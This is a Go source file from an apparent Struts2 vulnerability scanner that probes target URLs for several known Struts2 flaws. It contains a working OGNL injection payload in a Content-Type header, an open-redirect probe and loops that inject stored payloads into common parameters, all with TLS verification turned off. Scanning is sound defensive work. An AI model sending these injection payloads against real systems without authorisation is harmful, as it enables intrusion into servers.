package VulnerabilityScanner

import (
	"Struts2Scanner/funcs"
	"Struts2Scanner/vars"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"strings"
	"time"
)

func Gpoc(poc, url string, header map[string]string) (string,error) {
	//跳过证书验证
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}

	req, err := http.NewRequest("GET", url+poc,nil)
	if err != nil {
		return "", err
	}

	req.Header.Add("User-Agent", header["User-Agent"])
	req.Header.Add("Accept", header["Accept"])
	req.Header.Add("Content-Type", header["Content-Type"])

	reqs, err := client.Do(req)
	if err != nil {
		return "",err
	}

	defer reqs.Body.Close()
	body, _ := ioutil.ReadAll(reqs.Body)
	return string(body),nil
}

func Gpoc0452(url string) error {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return err
	}
	req.Header.Add("Content-Type", "${#context[\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"].addHeader(\"testvuln\",1234*1234)}.multipart/form-data")
	reqs, errs := client.Do(req)
	if errs != nil {
		return errs
	}
	if strings.Contains(reqs.Header.Get("testvuln"),"1522756") == true {
		fmt.Printf("\033[1;31m%s\033[0m\n","[+]目标存在struts2-045-2漏洞")
		funcs.AddHistory(url+" find struts2-045-2 successfully\n")
	}else {
		fmt.Printf("\033[1;32m%s\033[0m\n","[-]目标不存在struts2-045-2漏洞")
	}
	return nil
}

func Gpoc017(url string, header map[string]string) error {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}
	req, err := http.NewRequest("GET", url+"?redirect:https://www.baidu.com/%23", nil)
	if err != nil {
		return err
	}
	req.Header.Add("User-Agent", header["User-Agent"])
	req.Header.Add("Accept", header["Accept"])
	req.Header.Add("Content-Type", header["Content-Type"])

	reqs, err := client.Do(req)
	if err != nil {
		return err
	}
	if reqs.StatusCode == 302 {
		fmt.Printf("\033[1;31m%s\033[0m\n","[+]struts2-017检测成功（暂无可用POC）：")
		funcs.AddHistory(url+" find struts2-017 successfully\n")
	}else {
		fmt.Printf("\033[1;32m%s\033[0m\n","[-]目标不存在struts2-017漏洞")
	}
	return nil
}

func Gpoc053(url string, header map[string]string) error {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}
	var params = []string{
		"id",
		"name",
		"filename",
		"username",
		"password",
	}
	for i := range params{
		req, err := http.NewRequest("GET", url+"?"+params[i]+"="+vars.Poc["ST2_053"], nil)
		if err != nil {
			return err
		}
		req.Header.Add("User-Agent", header["User-Agent"])
		req.Header.Add("Accept", header["Accept"])
		req.Header.Add("Content-Type", header["Content-Type"])
		reqs, errs := client.Do(req)
		if errs != nil {
			return errs
		}
		body, _ := ioutil.ReadAll(reqs.Body)
		defer reqs.Body.Close()
		funcs.VulnerabilityChecking(url, string(body), "struts2-053"+"参数（"+params[i]+"）")
	}
	return nil
}

func Gpoc057(urll string, header map[string]string) error {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}
	surl,_ := url.Parse(urll)
	rul1 := strings.Replace(urll, surl.Path, "", -1) + vars.Poc["struts2_057_1"] + surl.Path
	req1, err1 := http.NewRequest("GET", rul1, nil)
	if err1 != nil {
		return err1
	}
	req1.Header.Add("User-Agent", header["User-Agent"])
	req1.Header.Add("Accept", header["Accept"])
	reqs1, err1 := client.Do(req1)
	if err1 != nil {
		return err1
	}
	body, _ := ioutil.ReadAll(reqs1.Body)
	defer reqs1.Body.Close()
	funcs.VulnerabilityChecking(urll, string(body), "struts2-057-1")

	rul2 := strings.Replace(urll, surl.Path, "", -1) + vars.Poc["struts2_057_2"] + surl.Path
	req2, err2 := http.NewRequest("GET", rul2, nil)
	if err2 != nil {
		return err2
	}
	req2.Header.Add("User-Agent", header["User-Agent"])
	req2.Header.Add("Accept", header["Accept"])
	reqs2, err2 := client.Do(req2)
	if err2 != nil {
		return err2
	}
	body, _ = ioutil.ReadAll(reqs2.Body)
	defer reqs2.Body.Close()
	funcs.VulnerabilityChecking(urll, string(body), "检测struts2-057-2")
	return nil
}